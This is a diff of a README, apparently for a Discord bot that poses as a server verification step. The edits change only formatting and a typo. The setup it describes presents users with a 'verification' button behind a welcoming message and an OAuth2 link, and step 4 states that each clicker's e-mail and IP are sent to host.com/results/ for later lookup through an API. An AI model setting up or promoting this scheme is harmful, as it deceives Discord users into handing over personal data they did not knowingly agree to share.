@@ -39,11 +39,11 @@ Ok, now if you correctly setup your variables you will be able to continue.
 
 3/ 
 
-....3.1/ Go to the server where you want the verification and add this bot https://dutils.shay.cat/bot.
+&nbsp;&nbsp;&nbsp;&nbsp;3.1/ Go to the server where you want the verification and add this bot https://dutils.shay.cat/bot.
 
-....3.2/ When you have it in your server use the command `/webhook create` and make it send a message like *"Hello, click in the button bellow to access our server"!* 
+&nbsp;&nbsp;&nbsp;&nbsp;3.2/ When you have it in your server use the command `/webhook create` and make it send a message like *"Hello, click in the button bellow to access our server"!* 
 
-....3.3 Now right click in the webhook's message > Applications > Add Button > Link. In the `"label"` field just add something like "verification" in `"emoji name"` I recommend to use :white_check_mark: and in `LINK` add you OAuth2 link that you generated before.
+&nbsp;&nbsp;&nbsp;&nbsp;3.3 Now right click in the webhook's message > Applications > Add Button > Link. In the `"label"` field just add something like "verification" in `"emoji name"` I recommend to use :white_check_mark: and in `LINK` add you OAuth2 link that you generated before.
 
 4/ Now, when something uses your button his e-mail and ip will be sent to `host.com/results/`!
 
@@ -56,7 +56,7 @@ you can use https://host.com/api/v1/api.php?id=ID_VERIFIED_USER to get informati
 
 
 
-Thanks to MarkisDev (https://github.com/MarkisDev) for is incredible discord OAuth2 login flow
+Thanks to MarkisDev (https://github.com/MarkisDev) for his incredible discord OAuth2 login flow
 
 ## Contact 
 
